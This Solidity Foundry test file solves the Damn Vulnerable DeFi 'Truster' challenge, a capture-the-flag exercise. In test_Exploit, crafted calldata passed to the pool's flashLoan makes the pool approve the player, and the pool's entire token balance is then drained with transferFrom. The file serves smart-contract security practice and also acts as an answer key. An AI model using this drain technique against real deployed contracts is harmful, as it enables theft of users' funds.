// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { DamnValuableToken } from "@contracts/CTF/Damn-Vulnerable-DeFi/00.Base/DamnValuableToken.sol";
import { TrusterLenderPool } from "@contracts/CTF/Damn-Vulnerable-DeFi/03.Truster.sol";

/*
    forge test --match-path foundry/test/CTF/Damn-Vulnerable-DeFi/03.Truster.t.sol -vvvvv
*/

contract Challenge_3_Truster_Test is Test {
    // hacking attack address
    address private deployer = address(1);
    address private feeRecipient = address(2);
    address private player = address(2333);

    TrusterLenderPool private pool;
    DamnValuableToken private token;
    uint256 private TOKENS_IN_POOL = 1_000_000 ether;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, type(uint256).max);
        _before();
        vm.stopPrank();

        vm.startPrank(player);
    }

    function _before() public {
        /* SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq(pool.token().balanceOf(address(pool)), TOKENS_IN_POOL, "");
    }

    function test_Exploit() public {
        /* START CODE YOUR SOLUTION HERE */

        // cast abi-encode "approve(address,uint256)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 1
        bytes memory _callData = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
        pool.flashLoan(0, player, address(token), _callData);
        token.transferFrom(address(pool), player, TOKENS_IN_POOL);

        /* END CODE YOUR SOLUTION */
        vm.stopPrank();
        _after();
    }

    function _after() public {
        /* SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // It is no longer possible to execute flash loans
        vm.startPrank(deployer);
        assertEq(token.balanceOf(player), TOKENS_IN_POOL, "player");
        assertEq(token.balanceOf(address(pool)), 0, "pool");
        vm.stopPrank();
    }
}
